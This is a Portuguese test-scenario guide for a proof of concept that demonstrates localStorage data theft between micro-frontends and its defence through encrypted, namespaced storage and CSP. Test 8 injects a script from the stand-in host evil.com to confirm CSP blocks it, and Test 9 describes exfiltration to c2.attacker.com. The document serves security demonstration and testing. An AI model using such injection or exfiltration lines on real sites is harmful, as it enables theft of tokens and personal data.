# 🧪 Cenários de Teste

Este documento descreve cenários de teste para validar a POC.

## ✅ Testes Funcionais

### Teste 1: Carregamento Inicial

**Objetivo**: Verificar que a aplicação inicia corretamente

**Passos**:
1. Execute `npm run dev`
2. Acesse http://localhost:3000
3. Aguarde 2 segundos

**Resultado Esperado**:
- ✅ Interface carrega sem erros
- ✅ Dois cards de MFE visíveis
- ✅ Console de segurança exibe logs iniciais
- ✅ Botão "Modo Vulnerável" está ativo

---

### Teste 2: Modo Vulnerável - Ataque Completo

**Objetivo**: Demonstrar exfiltração de dados

**Passos**:
1. Certifique-se que está em "Modo Vulnerável"
2. Clique em "🔄 Simular Login" no Dashboard
3. Aguarde o Widget carregar (1 segundo)
4. Observe o console de segurança

**Resultado Esperado**:
- ✅ Dashboard salva: jwt, userId, email, balance
- ✅ Widget captura TODOS os itens do localStorage
- ✅ Console exibe: "🚨 ATAQUE CONCLUÍDO: X itens exfiltrados"
- ✅ Payload JSON completo é exibido
- ✅ Itens críticos marcados com 🔴

**Verificação Manual**:
```javascript
// No DevTools Console:
localStorage.getItem('jwt'); // Deve retornar o token completo
```

---

### Teste 3: Modo Seguro - Defesa Efetiva

**Objetivo**: Verificar que dados criptografados estão protegidos

**Passos**:
1. Clique em "🛡️ Modo Seguro"
2. Clique em "🔄 Simular Login" no Dashboard
3. Aguarde o Widget carregar
4. Observe o console de segurança

**Resultado Esperado**:
- ✅ Dashboard usa SecureStorage
- ✅ Dados salvos com prefixo `mfe_dashboard:`
- ✅ Widget encontra poucos/nenhum item não-protegido
- ✅ Console exibe: "✅ Widget bloqueado: Falha na decriptação"
- ✅ Console exibe: "🛡️ DEFESA EFETIVA"

**Verificação Manual**:
```javascript
// No DevTools Console:
localStorage.getItem('mfe_dashboard:jwt'); 
// Deve retornar blob criptografado (ex: "q7wE9mK2xN8...")

// Tentar decodificar (vai falhar)
JSON.parse(atob(localStorage.getItem('mfe_dashboard:jwt')));
// → Erro ou bytes ilegíveis
```

---

### Teste 4: Verificar Storage

**Objetivo**: Inspecionar o que está armazenado

**Passos**:
1. Em qualquer modo, clique em "🔍 Verificar Storage"
2. Observe os logs

**Resultado Esperado (Vulnerável)**:
- ✅ Lista todos os itens em texto plano
- ✅ Exibe valores completos (truncados a 50 chars)

**Resultado Esperado (Seguro)**:
- ✅ Decripta com sucesso usando a chave correta
- ✅ Exibe JWT e userId recuperados

---

### Teste 5: Alternância de Modos

**Objetivo**: Verificar transição entre modos

**Passos**:
1. Inicie em "Modo Vulnerável"
2. Faça login
3. Mude para "Modo Seguro"
4. Observe que os MFEs recarregam
5. Faça login novamente

**Resultado Esperado**:
- ✅ Console é limpo ao mudar de modo
- ✅ MFEs são recarregados
- ✅ Dados antigos (texto plano) ainda visíveis no localStorage
- ✅ Novos dados (criptografados) adicionados com namespace

---

## 🔒 Testes de Segurança

### Teste 6: Tentativa de Decriptação Sem Chave

**Objetivo**: Simular atacante tentando decriptar

**Passos**:
1. Modo Seguro ativo
2. Faça login
3. Abra DevTools Console
4. Execute:
```javascript
// Tentar criar SecureStorage com chave errada
const fakeKey = 'YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=';
const fakeStore = new SecureStorage('mfe_dashboard', fakeKey);

// Tentar ler JWT
await fakeStore.getItem('jwt');
```

**Resultado Esperado**:
- ✅ Retorna `null` (falha na decriptação)
- ✅ Não lança erro não tratado
- ✅ Console pode exibir "Erro ao recuperar item"

---

### Teste 7: Cross-Namespace Access

**Objetivo**: Verificar que widgets não acessam outros namespaces

**Passos**:
1. Modo Seguro ativo
2. Dashboard salva em `mfe_dashboard:jwt`
3. Widget tenta criar:
```javascript
const widgetStore = new SecureStorage('mfe_widget', window.CRYPTO_KEY);
await widgetStore.getItem('jwt'); // Busca em mfe_widget:jwt
```

**Resultado Esperado**:
- ✅ Retorna `null` (chave não existe no namespace do widget)
- ✅ Não consegue acessar `mfe_dashboard:jwt`

---

### Teste 8: Injeção de Script Externo (CSP)

**Objetivo**: Verificar que CSP bloqueia scripts externos

**Passos**:
1. Abra DevTools Console
2. Tente injetar script externo:
```javascript
const script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);
```

**Resultado Esperado**:
- ✅ CSP bloqueia o carregamento
- ✅ Erro no console: "Refused to load the script..."
- ✅ Script não executa

**Verificar Header**:
```bash
curl -I http://localhost:3000 | grep Content-Security-Policy
```

---

### Teste 9: Tentativa de Exfiltração

**Objetivo**: Verificar tentativa de envio para domínio externo

**Passos**:
1. Modo Vulnerável ativo
2. Faça login e aguarde Widget
3. Observe logs do servidor (terminal)

**Resultado Esperado**:
- ✅ Servidor NÃO recebe requisição (domínio c2.attacker.com não existe)
- ✅ Navegador bloqueia por CORS ou CSP (dependendo da config)
- ✅ DevTools Network mostra requisição "cancelled" ou "blocked"

**Nota**: Para testar completamente, você precisaria:
- Configurar um servidor mock em c2.attacker.com (DNS local)
- Ou modificar o código para usar localhost:3000/api/collect

---

### Teste 10: Persistência de Dados

**Objetivo**: Verificar que dados persistem após reload

**Passos**:
1. Modo Seguro ativo
2. Faça login (dados salvos)
3. Recarregue a página (F5)
4. Clique em "🔍 Verificar Storage"

**Resultado Esperado**:
- ✅ Dados criptografados ainda presentes
- ✅ Podem ser decriptados com sucesso
- ✅ JWT recuperado corretamente

---

## 🧩 Testes de Integração

### Teste 11: Carregamento Assíncrono

**Objetivo**: Simular carregamento de MFE atrasado

**Passos**:
1. Modifique `index.html` linha ~241
2. Aumente o delay para 5000ms
3. Faça login no Dashboard
4. Aguarde o Widget carregar

**Resultado Esperado**:
- ✅ Dashboard funciona normalmente
- ✅ Dados são salvos antes do Widget carregar
- ✅ Widget ainda consegue capturar dados (modo vulnerável)
- ✅ Demonstra que timing não protege contra o ataque

---

### Teste 12: Múltiplas Sessões

**Objetivo**: Testar comportamento com múltiplas abas

**Passos**:
1. Abra http://localhost:3000 em duas abas
---

## 🎯 Critérios de Sucesso

A POC está funcionando corretamente se:

- [ ] Todos os testes passam
- [ ] Modo Vulnerável demonstra claramente o risco
- [ ] Modo Seguro bloqueia efetivamente o ataque
- [ ] Interface é intuitiva e logs são claros
- [ ] CSP headers estão presentes
